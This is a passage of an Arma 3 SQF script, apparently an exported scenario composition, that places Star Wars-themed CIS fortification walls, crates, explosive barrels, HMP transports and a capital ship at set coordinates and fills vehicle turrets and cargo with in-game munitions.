_object41 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object41 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object41 setPosASL [14919.9,20298.8,36.625];


_object42 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object42 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object42 setPosASL [14919.6,20299.6,36.625];


_object43 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object43 setVectorDirAndUp [[0.500001,0.866025,0],[0,0,1]];
_object43 setPosASL [14915.5,20285.9,36.625];


_object44 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object44 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object44 setPosASL [14960.8,20313.8,39.375];


_object45 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object45 setVectorDirAndUp [[-0.258819,0.965926,0],[0,0,1]];
_object45 setPosASL [14915.1,20287.4,36.625];


_object46 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object46 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object46 setPosASL [14926.3,20299.3,36.625];


_object47 = createVehicle [""land_3as_cis_wall_med_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object47 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object47 setPosASL [14964.5,20325.3,39.375];


_object48 = createVehicle [""land_3as_cis_ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object48 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object48 setPosASL [14924.6,20307.3,36.625];


_object49 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object49 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object49 setPosASL [14968.6,20337.3,39.375];


_object50 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object50 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object50 setPosASL [14932.4,20314.9,36.625];


_object51 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object51 setVectorDirAndUp [[-0.500001,-0.866025,0],[0,0,1]];
_object51 setPosASL [14911.3,20327.3,36.625];


_object52 = createVehicle [""land_3as_cis_wall_Gate_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object52 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object52 setPosASL [14941.1,20353.6,39.375];


_object53 = createVehicle [""land_3as_cis_wall_door_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object53 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object53 setPosASL [14924.1,20325.6,36.625];


_object54 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object54 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object54 setPosASL [14913.4,20369.1,39.375];


_object55 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object55 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object55 setPosASL [14966,20357.4,38];


_object56 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object56 setVectorDirAndUp [[0.5,-0.866025,0],[0,0,1]];
_object56 setPosASL [14968.5,20365.8,38];


_object57 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object57 setVectorDirAndUp [[0.707107,0.707107,0],[0,0,1]];
_object57 setPosASL [14964.9,20361.4,38];


_object58 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object58 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object58 setPosASL [14963.6,20361.1,38];


_object59 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object59 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object59 setPosASL [14969.6,20364.6,38];


_object60 = createVehicle [""3AS_HMP_Transport"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object60 setVectorDirAndUp [[0.496648,0.867952,0.000118211],[-4.82591e-005,-0.000108581,1]];
_object60 setPosASL [14930.8,20394.4,39.8878];
_object60 setFuel 0.999992;
[_object60, [], [], true] call BIS_fnc_initVehicle;

{_object60 removeMagazineTurret (_x select [0, 2])} forEach magazinesAllTurrets _object60;
{_object60 addMagazineTurret _x} forEach [[""HMP_Cannon_Mag"",[-1],5000],[""HMP_Cannon_Mag"",[-1],5000],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[2],5000],[""HMP_Cannon_Mag"",[2],5000]];
_object61 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object61 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object61 setPosASL [14965.9,20356.1,38];


_object62 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object62 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object62 setPosASL [14967.3,20357.3,38];


_object63 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object63 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object63 setPosASL [14969.5,20364,38];


_object64 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object64 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object64 setPosASL [14969,20364.4,38];


_object65 = createVehicle [""Land_OPTRE_landingpad"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object65 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object65 setPosASL [14939.5,20398.9,36.125];


_object66 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object66 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object66 setPosASL [14968.5,20365.5,40];


_object67 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object67 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object67 setPosASL [14966.6,20366,38];


_object68 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object68 setVectorDirAndUp [[-0.499999,0.865775,0.0208767],[0.0186626,-0.013329,0.999737]];
_object68 setPosASL [14914.3,20373.8,36.3894];


_object69 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object69 setVectorDirAndUp [[0.96572,0.259176,-0.0145721],[0.0186626,-0.013329,0.999737]];
_object69 setPosASL [14913.5,20374.5,36.4141];


_object70 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object70 setVectorDirAndUp [[-1,1.19249e-008,0],[0,0,1]];
_object70 setPosASL [14964.1,20361.1,38.75];


_object71 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object71 setVectorDirAndUp [[0,0.999911,0.0133313],[0.0186626,-0.013329,0.999737]];
_object71 setPosASL [14915.5,20373.9,36.3699];


_object72 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object72 setVectorDirAndUp [[0.258819,0.965926,0],[0,0,1]];
_object72 setPosASL [14914.8,20373.9,37.25];


_object73 = createVehicle [""DBA_CapitalShips_Munificent"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object73 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object73 setPosASL [14953,20393.5,299.25];


_object74 = createVehicle [""3AS_HMP_Transport"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object74 setVectorDirAndUp [[0.499614,0.866248,6.47285e-005],[-0.000114319,-8.78845e-006,1]];
_object74 setPosASL [14937.6,20407,39.889];
[_object74, [], [], true] call BIS_fnc_initVehicle;

{_object74 removeMagazineTurret (_x select [0, 2])} forEach magazinesAllTurrets _object74;
{_object74 addMagazineTurret _x} forEach [[""HMP_Cannon_Mag"",[-1],5000],[""HMP_Cannon_Mag"",[-1],5000],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[2],5000],[""HMP_Cannon_Mag"",[2],5000]];
_object75 = createVehicle [""3AS_HMP_Transport"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object75 setVectorDirAndUp [[0.563461,0.826142,-5.41381e-005],[0.000408498,-0.00021308,1]];
_object75 setPosASL [14950.3,20399.5,39.8884];
_object75 setFuel 0.999901;
[_object75, [], [], true] call BIS_fnc_initVehicle;

{_object75 removeMagazineTurret (_x select [0, 2])} forEach magazinesAllTurrets _object75;
{_object75 addMagazineTurret _x} forEach [[""HMP_Cannon_Mag"",[-1],5000],[""HMP_Cannon_Mag"",[-1],5000],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[2],5000],[""HMP_Cannon_Mag"",[2],5000]];
_object76 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object76 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object76 setPosASL [14915.4,20405.3,39.375];


_object77 = createVehicle [""3AS_HMP_Transport"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object77 setVectorDirAndUp [[0.579049,0.815293,-6.27048e-005],[-0.000119171,0.00016155,1]];
_object77 setPosASL [14940.7,20389.6,39.888];
_object77 setFuel 0.999923;
[_object77, [], [], true] call BIS_fnc_initVehicle;

{_object77 removeMagazineTurret (_x select [0, 2])} forEach magazinesAllTurrets _object77;
{_object77 addMagazineTurret _x} forEach [[""HMP_Cannon_Mag"",[-1],5000],[""HMP_Cannon_Mag"",[-1],5000],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""240Rnd_CMFlare_Chaff_Magazine"",[-1],240],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[0],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[1],5000],[""HMP_Cannon_Mag"",[2],5000],[""HMP_Cannon_Mag"",[2],5000]];
_object78 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object78 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object78 setPosASL [14927.6,20426.1,39.375];


_object79 = createVehicle [""3as_Crate3_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object79 setVectorDirAndUp [[-0.865056,-0.500878,-0.028278],[0.00666787,-0.0678416,0.997674]];
_object79 setPosASL [14930.9,20428.3,37.2705];


_object80 = createVehicle [""3as_Crate3_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object80 setVectorDirAndUp [[-0.865056,-0.500878,-0.028278],[0.00666787,-0.0678416,0.997674]];
_object80 setPosASL [14931,20429,37.3215];


_object81 = createVehicle [""3as_Crate3_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object81 setVectorDirAndUp [[-0.865056,-0.500878,-0.028278],[0.00666787,-0.0678416,0.997674]];
_object81 setPosASL [14930.3,20428.8,37.2511];


_object82 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object82 setVectorDirAndUp [[-0.965831,0.258384,0.020185],[0.0173282,-0.0133293,0.999761]];
_object82 setPosASL [14954.3,20444.1,37.8214];


_object83 = createVehicle [""3as_ModularPlatform_BridgeSegment_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object83 setVectorDirAndUp [[0.599111,1.03974,0],[0,0,1.2]];
_object83 setPosASL [14915,20418.6,38.1307];


_object84 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object84 setVectorDirAndUp [[0.865985,-0.4996,-0.0216704],[0.0173282,-0.0133293,0.999761]];
_object84 setPosASL [14954.2,20441.9,37.7931];


_object85 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object85 setVectorDirAndUp [[-0.707099,0.706838,0.0197935],[0.0173282,-0.0106625,0.999793]];
_object85 setPosASL [14954.3,20446.4,37.8472];


_object86 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object86 setVectorDirAndUp [[0.498981,0.866613,0],[0,0,1]];
_object86 setPosASL [14918,20416.9,39.125];


_object87 = createVehicle [""land_3as_cis_wall_med_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object87 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object87 setPosASL [14961.5,20457.3,39.375];


_object88 = createVehicle [""3as_Crate3_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object88 setVectorDirAndUp [[0.00124777,-0.997695,-0.0678513],[0.00666787,-0.0678416,0.997674]];
_object88 setPosASL [14930.4,20429.4,37.3761];


_object89 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object89 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object89 setPosASL [14957.4,20445.3,39.375];


_object90 = createVehicle [""3as_small_crate_stack_2_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object90 setVectorDirAndUp [[0,0.9994,0.034647],[0.0173315,-0.0346418,0.99925]];
_object90 setPosASL [14948.8,20456.4,38.1422];


_object91 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object91 setVectorDirAndUp [[0.869426,-0.494063,0],[0,0,1]];
_object91 setPosASL [14927.4,20451.6,39.375];


_object92 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object92 setVectorDirAndUp [[0,0.999996,-0.00267442],[0.0186626,0.00267396,0.999822]];
_object92 setPosASL [14936.5,20454.5,38.2909];


_object93 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object93 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object93 setPosASL [14934,20442,39.375];


_object94 = createVehicle [""442_argon_covered_cis"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object94 setVectorDirAndUp [[-0.499888,-0.865882,-0.0189531],[0.00949805,-0.027363,0.99958]];
_object94 setPosASL [14951.1,20451.6,37.9548];
[_object94, [], [], true] call BIS_fnc_initVehicle;

clearItemCargoGlobal _object94;
clearWeaponCargoGlobal _object94;
clearMagazineCargoGlobal _object94;
clearBackpackCargoGlobal _object94;

{_object94 addItemCargoGlobal _x} forEach [[""ACE_EarPlugs"",20],[""ACE_Clacker"",2]];
{_object94 addWeaponCargoGlobal _x} forEach [["""",5],["""",5],[""SWLW_rps6_disposable"",5],[""SWLB_clone_binocular"",5]];
{_object94 addMagazineCargoGlobal _x} forEach [[""SWLW_beltGrenade_mag"",10],[""SmokeShellBlue"",10],[""SmokeShellRed"",10],[""SmokeShell"",10],[""ACE_M14"",10],[""Chemlight_blue"",10],[""Chemlight_red"",10],[""DemoCharge_Remote_Mag"",2],[""SWLW_E5_Mag"",25],[""SWLW_E5C_mag"",25]];

{_object94 removeMagazineTurret (_x select [0, 2])} forEach magazinesAllTurrets _object94;
{_object94 addMagazineTurret _x} forEach [];
_object95 = createVehicle [""442_argon_covered_cis"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object95 setVectorDirAndUp [[0.865662,-0.500056,-0.0239353],[0.0238552,-0.00655414,0.999694]];
_object95 setPosASL [14935.6,20451,38.3026];
[_object95, [], [], true] call BIS_fnc_initVehicle;

clearItemCargoGlobal _object95;
clearWeaponCargoGlobal _object95;
clearMagazineCargoGlobal _object95;
clearBackpackCargoGlobal _object95;

{_object95 addItemCargoGlobal _x} forEach [[""ACE_EarPlugs"",20],[""ACE_Clacker"",2]];
{_object95 addWeaponCargoGlobal _x} forEach [["""",5],["""",5],[""SWLW_rps6_disposable"",5],[""SWLB_clone_binocular"",5]];
{_object95 addMagazineCargoGlobal _x} forEach [[""SWLW_beltGrenade_mag"",10],[""SmokeShellBlue"",10],[""SmokeShellRed"",10],[""SmokeShell"",10],[""ACE_M14"",10],[""Chemlight_blue"",10],[""Chemlight_red"",10],[""DemoCharge_Remote_Mag"",2],[""SWLW_E5_Mag"",25],[""SWLW_E5C_mag"",25]];

{_object95 removeMagazineTurret (_x select [0, 2])} forEach magazinesAllTurrets _object95;
{_object95 addMagazineTurret _x} forEach [];
_object96 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object96 setVectorDirAndUp [[-0.965757,0.25887,0.0173344],[0.0186626,0.00267396,0.999822]];
_object96 setPosASL [14934,20455,38.3366];


_object97 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object97 setVectorDirAndUp [[-0.965781,-0.258684,0.018719],[0.0186626,0.00267396,0.999822]];
_object97 setPosASL [14933.6,20456.1,38.3404];


_object98 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object98 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object98 setPosASL [14965.5,20469.1,39.375];


_object99 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object99 setVectorDirAndUp [[0.964411,-0.258707,-0.0546063],[0.0572386,0.0026477,0.998357]];
_object99 setPosASL [14932.1,20455.1,38.3843];


_object100 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object100 setVectorDirAndUp [[-0.707127,0.706996,0.0113144],[0.00800059,-0.00800033,0.999936]];
_object100 setPosASL [14936.6,20456.3,38.2868];


_object101 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object101 setVectorDirAndUp [[-0.500001,-0.866025,0],[0,0,1]];
_object101 setPosASL [14944.3,20481.5,39.375];


_object102 = createVehicle [""land_3as_cis_ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object102 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object102 setPosASL [14954.1,20464.5,39.375];


_object103 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object103 setVectorDirAndUp [[0.499998,0.866022,-0.00267466],[0.0174993,-0.00701535,0.999822]];
_object103 setPosASL [14936.6,20454.5,40.2501];


_object104 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object104 setVectorDirAndUp [[-0.499899,-0.866005,0.0116472],[0.0186626,0.00267396,0.999822]];
_object104 setPosASL [14938.1,20454.3,38.262];


_object105 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object105 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object105 setPosASL [14955.3,20476.4,39.375];


_object106 = createVehicle [""3as_small_crate_stack_2_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object106 setVectorDirAndUp [[0,0.999645,0.0266571],[-0.0133317,-0.0266547,0.999556]];
_object106 setPosASL [14944.6,20475.4,38.6287];


_object107 = createVehicle [""3as_Backless_Mortar_Pit_Trench"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object107 setVectorDirAndUp [[-0.965799,-0.257927,-0.0265567],[-0.0146602,-0.047938,0.998743]];
_object107 setPosASL [14911.8,20448.3,38.4812];


_object108 = createVehicle [""3as_Small_Box_4_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object108 setVectorDirAndUp [[0,0.998124,0.0612179],[0.00666787,-0.0612166,0.998102]];
_object108 setPosASL [14936.4,20439.3,37.9196];


_object109 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object109 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object109 setPosASL [14933.9,20455.8,39.125];


_object110 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object110 setVectorDirAndUp [[0.873134,-0.48748,0],[0,0,1]];
_object110 setPosASL [14933.5,20467.9,39.375];


_object111 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object111 setVectorDirAndUp [[0.500001,0.866025,0],[0,0,1]];
_object111 setPosASL [14982,20301.4,39.375];


_object112 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object112 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object112 setPosASL [14970.8,20306.6,39.375];


_object113 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object113 setVectorDirAndUp [[0.866025,-0.500001,0],[0,0,1]];
_object113 setPosASL [15029.8,20338.9,40.706];


_object114 = createVehicle [""3as_Backless_Mortar_Pit_Trench"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object114 setVectorDirAndUp [[0.965133,0.261415,0.0134183],[-0.0239912,0.0372956,0.999016]];
_object114 setPosASL [15014.5,20335.3,38.6167];


_object115 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object115 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object115 setPosASL [14999.1,20330.9,39.375];


_object116 = createVehicle [""3as_ModularPlatform_BridgeSegment_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object116 setVectorDirAndUp [[0.599111,1.03974,0],[0,0,1.2]];
_object116 setPosASL [15027.6,20354.3,38.6307];


_object117 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object117 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object117 setPosASL [14992.8,20314.8,39.375];


_object118 = createVehicle [""3as_ModularPlatform_BridgeSegment_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object118 setVectorDirAndUp [[0.599111,1.03974,0],[0,0,1.2]];
_object118 setPosASL [15019.4,20359,38.6307];


_object119 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object119 setVectorDirAndUp [[0,0.99957,-0.0293202],[-0.00399675,0.0293199,0.999562]];
_object119 setPosASL [14992.6,20336.6,38.2087];


_object120 = createVehicle [""3as_ModularPlatform_BridgeSegment_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object120 setVectorDirAndUp [[0.599111,1.03974,0],[0,0,1.2]];
_object120 setPosASL [15011.1,20363.8,38.6307];


_object121 = createVehicle [""3as_large_crate_stack_3_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object121 setVectorDirAndUp [[0,0.99985,-0.0173282],[-0.0479448,0.0173082,0.9987]];
_object121 setPosASL [14980.9,20315.6,38.4993];


_object122 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object122 setVectorDirAndUp [[-0.498982,-0.866613,0],[0,0,1]];
_object122 setPosASL [15007.9,20365.5,40.25];


_object123 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object123 setVectorDirAndUp [[-0.51209,-0.858932,0],[0,0,1]];
_object123 setPosASL [15019.9,20358.9,40.125];


_object124 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object124 setVectorDirAndUp [[0.51209,0.858932,0],[0,0,1]];
_object124 setPosASL [15018.8,20359.5,40.1237];


_object125 = createVehicle [""3as_small_crate_stack_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object125 setVectorDirAndUp [[0.707107,-0.707107,0],[0,0,1]];
_object125 setPosASL [14977.5,20358.5,38];


_object126 = createVehicle [""3as_small_crate_stack_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object126 setVectorDirAndUp [[-0.499215,-0.866445,-0.00757488],[-0.0359766,0.0119922,0.999281]];
_object126 setPosASL [14992.1,20346.5,38.0207];


_object127 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object127 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object127 setPosASL [15011,20377.4,39.375];


_object128 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object128 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object128 setPosASL [14999,20356.6,39.375];


_object129 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object129 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object129 setPosASL [15021.8,20391.1,39.375];


_object130 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object130 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object130 setPosASL [14981.8,20359.2,38.0052];


_object131 = createVehicle [""3as_Crate3_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object131 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object131 setPosASL [15002.4,20393.6,37.75];


_object132 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object132 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object132 setPosASL [14992.5,20340.5,39.375];


_object133 = createVehicle [""3as_Crate3_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object133 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object133 setPosASL [15001.9,20394.3,37.75];


_object134 = createVehicle [""3as_small_crate_stack_2_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object134 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object134 setPosASL [14977.4,20352.4,38.25];


_object135 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object135 setVectorDirAndUp [[-0.707107,0.707107,0],[0,0,1]];
_object135 setPosASL [15004,20395.8,38.5];


_object136 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object136 setVectorDirAndUp [[-0.866025,-0.5,0],[0,0,1]];
_object136 setPosASL [14976.8,20362.9,38];


_object137 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object137 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object137 setPosASL [15003.9,20395.1,37.75];


_object138 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object138 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object138 setPosASL [14974,20354.6,38];


_object139 = createVehicle [""3as_crate5_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object139 setVectorDirAndUp [[-1,1.19249e-008,0],[0,0,1]];
_object139 setPosASL [15003.9,20396.3,37.75];


_object140 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object140 setVectorDirAndUp [[0.707107,-0.707107,0],[0,0,1]];
_object140 setPosASL [14972.9,20354.4,38];


_object141 = createVehicle [""3as_Crate3_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object141 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object141 setPosASL [15001.6,20393.5,37.75];


_object142 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object142 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object142 setPosASL [14970.4,20365.4,38];


_object143 = createVehicle [""land_3as_cis_wall_med_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
